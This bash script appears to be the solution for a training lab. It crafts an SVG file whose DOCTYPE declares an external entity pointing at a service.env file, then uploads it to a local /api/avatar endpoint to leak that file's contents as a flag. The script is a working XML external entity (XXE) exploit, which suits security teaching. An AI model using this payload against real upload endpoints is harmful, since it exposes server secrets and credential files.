#!/usr/bin/env bash
# Lab 18 — SVG is XML. A DOCTYPE declares an entity; the parser fetches it.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:9180}"
. "$(dirname "$0")/../lib/h5i.sh"
new_session lab18
WORK="$(mktemp -d)"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1; rm -rf "$WORK"' EXIT

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null

# The homepage names the service directory.
DIR="$("$H5I" websec show res_0 --session "$SESSION" --raw |
    python3 -c 'import re,sys;m=re.search(r"<code>(\S+)/service\.env</code>",sys.stdin.read());print(m.group(1) if m else "")')"

cat > "$WORK/avatar.svg" <<XML
<?xml version="1.0"?>
<!DOCTYPE svg [ <!ENTITY leak SYSTEM "file://$DIR/service.env"> ]>
<svg xmlns="http://www.w3.org/2000/svg"><title>&leak;</title></svg>
XML

# `--set-file multipart.file=` puts the file's bytes in the part, unaltered:
# a command line is text and an upload is bytes.
send "$SESSION" req_0 --create \
    --set method=POST --set path=/api/avatar \
    --set-file "multipart.file=$WORK/avatar.svg" \
    --set multipart.file.filename=avatar.svg \
    --set multipart.file.content_type=image/svg+xml | flag
